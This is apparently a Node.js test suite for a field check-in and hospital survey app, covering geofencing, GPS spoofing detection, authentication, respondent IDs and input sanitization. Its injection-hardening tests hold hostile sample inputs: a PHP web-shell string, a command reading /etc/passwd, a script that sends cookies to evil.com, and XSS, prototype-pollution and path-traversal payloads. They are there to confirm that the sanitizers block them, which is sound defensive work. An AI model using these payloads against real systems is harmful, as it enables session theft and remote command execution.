const assert = require("node:assert/strict");
const { execFileSync } = require("node:child_process");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const projectRoot = path.resolve(__dirname, "..");
const outDir = fs.mkdtempSync(path.join("/tmp", "field-checkin-qa-"));

try {
  const tscBin = require.resolve("typescript/bin/tsc");
  execFileSync(
    process.execPath,
    [
      tscBin,
      path.join(projectRoot, "lib/geo.ts"),
      path.join(projectRoot, "lib/auth.ts"),
      path.join(projectRoot, "lib/survey-templates.ts"),
      "--outDir",
      outDir,
      "--module",
      "commonjs",
      "--target",
      "es2020",
      "--moduleResolution",
      "node",
      "--esModuleInterop",
      "--skipLibCheck",
    ],
    { stdio: "inherit" }
  );

  const {
    isValidCoordinates,
    calculateDistanceMeters,
    isPointInPolygon,
    evaluateGeofence,
    evaluateGpsTelemetry,
    formatDistance,
  } = require(path.join(outDir, "geo.js"));
  const {
    hashPassword,
    isHashedPassword,
    verifyPassword,
    createSessionToken,
    verifySessionToken,
    checkRateLimit,
    resetRateLimit,
    computeSha256Hex,
    isValidSelfieDataUrl,
    sanitizeInputText,
    sanitizeKeyValueMap,
    sanitizeHexColor,
    sanitizeCampaignForPublic,
  } = require(path.join(outDir, "auth.js"));
  const {
    DEFAULT_HOSPITAL_QUESTIONS,
    extractBrandPrefix,
    generateRespondentDigits,
    deriveDigitsFromRequestId,
    extractValidatedDigitsFromId,
    sanitizeClientRequestId,
    generateClientRequestId,
    generateRespondentId,
    findDuplicateUniqueSurveyAnswer,
  } = require(path.join(outDir, "survey-templates.js"));

  const results = [];

  function test(suite, name, fn) {
    try {
      fn();
      results.push({ suite, name, passed: true });
    } catch (err) {
      results.push({ suite, name, passed: false, error: err?.message || String(err) });
    }
  }

  // ── 1. GEOFENCE & COORDINATE QA ──
  test("Geofence", "Rejects invalid, NaN, out-of-range, and Null Island (0,0) coordinates", () => {
    assert.equal(isValidCoordinates(6.5244, 3.3792), true);
    assert.equal(isValidCoordinates(0, 0), false);
    assert.equal(isValidCoordinates(95, 3.3), false);
    assert.equal(isValidCoordinates(6.5, 190), false);
    assert.equal(isValidCoordinates(NaN, 3.3), false);
    assert.equal(isValidCoordinates(undefined, 3.3), false);
  });

  test("Geofence", "Calculates Haversine distance accurately", () => {
    const store = { latitude: 6.5702, longitude: 3.3496 };
    assert.equal(calculateDistanceMeters(store, store), 0);

    const near = calculateDistanceMeters({ latitude: 6.57035, longitude: 3.34972 }, store);
    assert.ok(near >= 15 && near <= 30, `Expected 15-30m, got ${near}m`);

    const far = calculateDistanceMeters({ latitude: 6.5757, longitude: 3.3544 }, store);
    assert.ok(far >= 700 && far <= 900, `Expected 700-900m, got ${far}m`);
  });

  test("Geofence", "Fails closed when store coordinates are missing/uncalibrated", () => {
    const res = evaluateGeofence(
      { latitude: 6.5702, longitude: 3.3496, accuracy: 10 },
      { latitude: NaN, longitude: NaN },
      200
    );
    assert.equal(res.inside, false);
    assert.equal(res.status, "out_of_bounds");
  });

  test("Geofence", "Rejects weak/coarse GPS fixes with accuracy > 150m", () => {
    const store = { latitude: 6.5702, longitude: 3.3496 };
    const res = evaluateGeofence(
      { latitude: 6.5702, longitude: 3.3496, accuracy: 220 },
      store,
      200
    );
    assert.equal(res.inside, false);
    assert.equal(res.status, "out_of_bounds");
    assert.match(res.message, /too weak/i);
  });

  test("Geofence", "Verifies on-site fix within radius", () => {
    const store = { latitude: 6.5702, longitude: 3.3496 };
    const res = evaluateGeofence(
      { latitude: 6.57035, longitude: 3.34972, accuracy: 12 },
      store,
      200
    );
    assert.equal(res.inside, true);
    assert.equal(res.status, "verified");
  });

  test("Geofence", "Marks bounded indoor drift (<= 50m beyond fence) as 'drift' and caps tolerance at 50m", () => {
    const store = { latitude: 6.5702, longitude: 3.3496 };
    const driftRes = evaluateGeofence(
      { latitude: 6.57227, longitude: 3.3496, accuracy: 40 },
      store,
      200
    );
    assert.equal(driftRes.inside, true);
    assert.equal(driftRes.status, "drift");

    const cappedRes = evaluateGeofence(
      { latitude: 6.57272, longitude: 3.3496, accuracy: 120 },
      store,
      200
    );
    assert.equal(cappedRes.inside, false);
    assert.equal(cappedRes.status, "out_of_bounds");
  });

  test("Geofence", "Supports polygon cluster geofence boundaries", () => {
    const poly = [
      { lat: 6.5, lng: 3.3 },
      { lat: 6.5, lng: 3.4 },
      { lat: 6.6, lng: 3.4 },
      { lat: 6.6, lng: 3.3 },
    ];
    assert.equal(isPointInPolygon({ latitude: 6.55, longitude: 3.35 }, poly), true);
    assert.equal(isPointInPolygon({ latitude: 6.65, longitude: 3.35 }, poly), false);
  });

  test("Geofence", "Formats distances cleanly", () => {
    assert.equal(formatDistance(45), "45m");
    assert.equal(formatDistance(1250), "1.3km");
    assert.equal(formatDistance(-1), "N/A");
  });

  // ── 2. ANTI-SPOOFING TELEMETRY QA ──
  test("Anti-Spoofing", "Detects stale GPS fix, future timestamp, static mock coordinates, and teleport jumps", () => {
    const now = Date.now();
    const clean = evaluateGpsTelemetry({ latitude: 6.57, longitude: 3.35, accuracy: 15, timestamp: now });
    assert.equal(clean.spoofRisk, "low");
    assert.equal(clean.freshnessOk, true);

    const future = evaluateGpsTelemetry({ latitude: 6.57, longitude: 3.35, accuracy: 15, timestamp: now + 60_000 });
    assert.equal(future.spoofRisk, "high");
    assert.equal(future.freshnessOk, false);

    const staticSamples = [
      { latitude: 6.5702, longitude: 3.3496, accuracy: 10, timestamp: now - 10_000 },
      { latitude: 6.5702, longitude: 3.3496, accuracy: 10, timestamp: now - 5_000 },
      { latitude: 6.5702, longitude: 3.3496, accuracy: 10, timestamp: now },
    ];
    const staticEval = evaluateGpsTelemetry(staticSamples[2], staticSamples, false);
    assert.equal(staticEval.spoofRisk, "medium");

    const teleportSamples = [
      { latitude: 6.5702, longitude: 3.3496, accuracy: 10, timestamp: now - 5_000 },
      { latitude: 6.5702, longitude: 3.3496, accuracy: 10, timestamp: now - 2_000 },
      { latitude: 6.6202, longitude: 3.3496, accuracy: 10, timestamp: now },
    ];
    const teleportEval = evaluateGpsTelemetry(teleportSamples[2], teleportSamples, false);
    assert.equal(teleportEval.spoofRisk, "high");
  });

  // ── 3. AUTH, CRYPTO & SANITIZATION QA ──
  test("Auth", "PBKDF2 password hashing, verification, and idempotency", () => {
    const hash = hashPassword("MySecret@2026");
    assert.equal(isHashedPassword(hash), true);
    assert.equal(hashPassword(hash), hash);
    assert.equal(verifyPassword("MySecret@2026", hash), true);
    assert.equal(verifyPassword("WrongPass", hash), false);
    assert.equal(verifyPassword("1234", "1234"), true);
  });

  test("Auth", "HMAC-SHA256 session tokens reject tampering and expiration", () => {
    const token = createSessionToken(
      { role: "ba", username: "ba1", campaignId: "cussons", storeCode: "clinic-1" },
      3600
    );
    const decoded = verifySessionToken(token);
    assert.ok(decoded);
    assert.equal(decoded.role, "ba");
    assert.equal(decoded.storeCode, "clinic-1");

    const [payload, sig] = token.split(".");
    assert.equal(verifySessionToken(`${payload}.${sig}x`), null);

    const expired = createSessionToken({ role: "superadmin", username: "admin" }, -10);
    assert.equal(verifySessionToken(expired), null);
  });

  test("Auth", "Rate limiter blocks after max attempts and resets cleanly", () => {
    const key = "qa-test-key";
    resetRateLimit(key);
    for (let i = 0; i < 3; i++) {
      assert.equal(checkRateLimit(key, 3, 60_000).allowed, true);
    }
    assert.equal(checkRateLimit(key, 3, 60_000).allowed, false);
    resetRateLimit(key);
    assert.equal(checkRateLimit(key, 3, 60_000).allowed, true);
  });

  test("Auth", "sanitizeCampaignForPublic strips all admin and store secrets", () => {
    const sanitized = sanitizeCampaignForPublic({
      id: "pz-cussons",
      name: "PZ Cussons",
      adminUsername: "sup",
      adminPassword: "secret-admin-password",
      adminPin: "9999",
      stores: [
        {
          id: "hosp-1",
          name: "General Hospital",
          pin: "1234",
          baPassword: "hashed:password",
          baUsername: "ba1",
        },
      ],
    });
    assert.equal("adminPassword" in sanitized, false);
    assert.equal("adminPin" in sanitized, false);
    assert.equal("pin" in sanitized.stores[0], false);
    assert.equal("baPassword" in sanitized.stores[0], false);
    assert.equal(sanitized.stores[0].hasPin, true);
  });

  test("Auth", "computeSha256Hex returns valid 64-char SHA-256 hex digest", () => {
    const digest = computeSha256Hex("data:image/jpeg;base64,abc123");
    assert.equal(digest.length, 64);
    assert.match(digest, /^[0-9a-f]{64}$/);
  });

  // ── 4. HOSPITAL SURVEY TEMPLATE & BRAND RESPONDENT ID + IDEMPOTENCY QA ──
  test("Hospital Survey", "Default Cussons/Molfix hospital template has all 5 required questions", () => {
    assert.equal(DEFAULT_HOSPITAL_QUESTIONS.length, 5);
    assert.equal(DEFAULT_HOSPITAL_QUESTIONS[0].label, "MOTHER'S NAME");
    assert.equal(DEFAULT_HOSPITAL_QUESTIONS[1].label, "PHONE NO.");
    assert.equal(DEFAULT_HOSPITAL_QUESTIONS[2].label, "CLINIC");
    assert.deepEqual(DEFAULT_HOSPITAL_QUESTIONS[2].options, ["ANC", "IMC"]);
    assert.equal(DEFAULT_HOSPITAL_QUESTIONS[3].label, "HOSPITAL NAME");
    assert.equal(DEFAULT_HOSPITAL_QUESTIONS[3].autoFillStoreName, true);
    assert.equal(DEFAULT_HOSPITAL_QUESTIONS[4].type, "radio_consent");
    assert.equal(DEFAULT_HOSPITAL_QUESTIONS[4].options?.length, 2);
  });

  test("Respondent ID", "Extracts brand prefix from first word of brandName or campaign name", () => {
    assert.equal(extractBrandPrefix({ brandName: "Molfix Activation" }), "MOLFIX");
    assert.equal(
      extractBrandPrefix({ name: "PZ CUSSONS BABY HOSPITAL SAMPLING ACTIVATION" }),
      "PZ"
    );
    assert.equal(
      extractBrandPrefix({
        brandName: "Golden Morn",
        name: "Nestlé Golden Morn Activation",
      }),
      "GOLDEN"
    );
    assert.equal(extractBrandPrefix({ id: "cussons-baby-2026" }), "CUSSONS");
    assert.equal(extractBrandPrefix(null), "RESP");
  });

  test("Respondent ID", "Generates valid 6-digit brand-prefixed Respondent IDs (MOLFIX-xxxxxx, PZ-xxxxxx)", () => {
    const molfixId = generateRespondentId({ brandName: "Molfix Activation" });
    assert.match(molfixId, /^MOLFIX-\d{6}$/);

    const pzId = generateRespondentId(
      { name: "PZ Cussons Baby Hospital Sampling Activation" },
      "849201"
    );
    assert.equal(pzId, "PZ-849201");

    const preservedDigits = generateRespondentId(
      { brandName: "Molfix Activation" },
      "MOLFIX-518204"
    );
    assert.equal(preservedDigits, "MOLFIX-518204");
  });

  test("Respondent ID Security", "Neutralizes path traversal, XSS injection, and prefix spoofing in Respondent IDs", () => {
    // Attacker tries path traversal or Firestore collection injection
    assert.equal(extractValidatedDigitsFromId("../../campaigns/_admin_config_"), undefined);
    assert.equal(extractValidatedDigitsFromId("MOLFIX-123456/../../admin"), undefined);
    assert.equal(extractValidatedDigitsFromId("<script>alert(1)</script>"), undefined);
    assert.equal(extractValidatedDigitsFromId("MOLFIX-12345"), undefined); // < 6 digits rejected

    // Even if attacker sends a spoofed prefix ("HACKED-849201") or path traversal, server enforces authoritative campaign brand prefix
    const safeFromSpoofedPrefix = generateRespondentId(
      { brandName: "Molfix Activation" },
      "HACKED-849201"
    );
    assert.equal(safeFromSpoofedPrefix, "MOLFIX-849201");

    const safeFromTraversal = generateRespondentId(
      { name: "PZ Cussons Activation" },
      "../../campaigns/_admin_config_"
    );
    assert.match(safeFromTraversal, /^PZ-\d{6}$/);
  });

  test("Idempotency", "Validates clientRequestId and deterministically maps legacy offline IDs on retry", () => {
    const validReq = generateClientRequestId();
    assert.equal(sanitizeClientRequestId(validReq), validReq);
    assert.equal(sanitizeClientRequestId("../bad/path"), undefined);
    assert.equal(sanitizeClientRequestId("short"), undefined);

    // Legacy offline item id ("offline_1732600123456") deterministically maps to the exact same PZ-xxxxxx ID across retries
    const retry1 = generateRespondentId(
      { name: "PZ Cussons Activation" },
      "offline_1732600123456",
      "offline_1732600123456"
    );
    const retry2 = generateRespondentId(
      { name: "PZ Cussons Activation" },
      "offline_1732600123456",
      "offline_1732600123456"
    );
    assert.match(retry1, /^PZ-\d{6}$/);
    assert.equal(retry1, retry2);
  });

  test("Idempotency", "Enforces uniqueValue survey fields across respondents while allowing idempotent retries of the same respondent", () => {
    const questions = [
      { id: "mother_name", label: "MOTHER'S NAME", type: "text", required: true },
      {
        id: "phone_no",
        label: "PHONE NO.",
        type: "tel",
        numericOnly: true,
        uniqueValue: true,
      },
    ];
    const existingSurveys = [
      {
        id: "PZ-849201",
        clientRequestId: "req_first_mother_12345",
        respondentPhone: "08031234567",
        surveyAnswers: { mother_name: "Mrs. Ngozi Eze", phone_no: "0803 123 4567" },
      },
    ];

    // 1. Different respondent trying to reuse the same phone number -> flagged as duplicate
    const conflict = findDuplicateUniqueSurveyAnswer({
      questions,
      incomingAnswers: { mother_name: "Mrs. Bisi Ade", phone_no: "0803-123-4567" },
      incomingPhone: "08031234567",
      existingSurveys,
      currentRespondentId: "PZ-999111",
      currentClientRequestId: "req_second_mother_67890",
    });
    assert.ok(conflict);
    assert.equal(conflict.questionId, "phone_no");

    // 2. Idempotent retry of the EXACT SAME survey (matching clientRequestId or respondentId) -> allowed (null)
    const retryByReqId = findDuplicateUniqueSurveyAnswer({
      questions,
      incomingAnswers: { mother_name: "Mrs. Ngozi Eze", phone_no: "08031234567" },
      incomingPhone: "08031234567",
      existingSurveys,
      currentRespondentId: "PZ-111222",
      currentClientRequestId: "req_first_mother_12345",
    });
    assert.equal(retryByReqId, null);

    const retryByRespId = findDuplicateUniqueSurveyAnswer({
      questions,
      incomingAnswers: { mother_name: "Mrs. Ngozi Eze", phone_no: "08031234567" },
      incomingPhone: "08031234567",
      existingSurveys,
      currentRespondentId: "PZ-849201",
      currentClientRequestId: "req_different_id_99999",
    });
    assert.equal(retryByRespId, null);
  });

  // ── 5. DEVTOOLS / CONSOLE / NETWORK / PHP / XSS / NOSQL INJECTION HARDENING QA ──
  test("Injection Hardening", "Blocks SVG data-URI XSS, PHP payloads, and non-base64 strings in selfie photoUrl", () => {
    const validJpeg = "data:image/jpeg;base64," + "A".repeat(120);
    const validPng = "data:image/png;base64," + "B".repeat(120);
    assert.equal(isValidSelfieDataUrl(validJpeg), true);
    assert.equal(isValidSelfieDataUrl(validPng), true);

    // Reject SVG data-URIs (can execute embedded <script> or onload handlers)
    assert.equal(
      isValidSelfieDataUrl("data:image/svg+xml;base64," + "A".repeat(120)),
      false
    );
    assert.equal(
      isValidSelfieDataUrl("data:image/svg+xml;utf8,<svg onload=alert(1)></svg>"),
      false
    );
    // Reject PHP code injected inside data-URI
    assert.equal(
      isValidSelfieDataUrl("data:image/jpeg;base64,<?php system($_GET['cmd']); ?>" + "A".repeat(80)),
      false
    );
  });

  test("Injection Hardening", "Strips PHP tags, HTML/Script tags, javascript: URIs, and null bytes from text inputs", () => {
    assert.equal(
      sanitizeInputText("Mrs. Ngozi <?php system('cat /etc/passwd'); ?> Eze"),
      "Mrs. Ngozi  system('cat /etc/passwd');  Eze"
    );
    assert.equal(
      sanitizeInputText("<?= $admin_secret ?><script>fetch('https://evil.com?c='+document.cookie)</script>Hello"),
      "$admin_secret Hello"
    );
    assert.equal(
      sanitizeInputText("<img src=x onerror=alert(1)>javascript:alert(1)"),
      "img src=x onerror=alert(1)alert(1)"
    );
    assert.equal(sanitizeInputText("Clean\u0000Name\u0007"), "CleanName");
  });

  test("Injection Hardening", "Blocks Prototype Pollution, Firestore dot-path keys, and script payloads in surveyAnswers", () => {
    const maliciousPayload = JSON.parse(
      '{"__proto__":"polluted","constructor":"bad","__name__":"override","nested.path.inject":"bad","mother_name":"<?php echo 1; ?><script>evil()</script>Mrs. Ade"}'
    );
    const cleaned = sanitizeKeyValueMap(maliciousPayload);
    assert.ok(cleaned);
    assert.equal(Object.prototype.hasOwnProperty.call(cleaned, "__proto__"), false);
    assert.equal("constructor" in cleaned && Object.prototype.hasOwnProperty.call(cleaned, "constructor"), false);
    assert.equal("__name__" in cleaned, false);
    assert.equal("nested.path.inject" in cleaned, false);
    assert.equal(cleaned.mother_name, "echo 1; Mrs. Ade");
  });

  test("Injection Hardening", "Enforces strict hex colors to block CSS style injection", () => {
    assert.equal(sanitizeHexColor("#14B8A6"), "#14B8A6");
    assert.equal(
      sanitizeHexColor("red; background-image: url(javascript:alert(1))", "#14B8A6"),
      "#14B8A6"
    );
  });

  const passed = results.filter((r) => r.passed).length;
  const failed = results.filter((r) => !r.passed);
  console.log(`QA_SUMMARY: ${passed}/${results.length} PASSED, ${failed.length} FAILED`);
  for (const r of results) {
    console.log(
      `${r.passed ? "PASS" : "FAIL"} [${r.suite}] ${r.name}${r.error ? ` -> ${r.error}` : ""}`
    );
  }
  if (failed.length > 0) process.exitCode = 1;
} finally {
  fs.rmSync(outDir, { recursive: true, force: true });
}
